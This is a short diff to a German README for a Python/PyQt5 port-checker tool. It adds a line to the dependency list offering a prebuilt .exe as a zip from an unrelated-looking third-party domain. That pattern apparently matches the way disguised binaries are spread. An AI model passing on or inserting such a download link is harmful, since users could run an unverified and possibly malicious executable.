@@ -10,6 +10,7 @@ Stelle sicher, dass die folgenden Abhängigkeiten installiert sind:
 - [Python 3](https://www.python.org/downloads/)
 - [PyQt5](https://pypi.org/project/PyQt5/)
 - `socket` (in der Standardbibliothek enthalten)
+- Fertige .exe (https://3mmooo.com/777/Portchecker.zip)
 
 Du kannst die benötigten Python-Bibliotheken mit folgendem Befehl installieren:
 
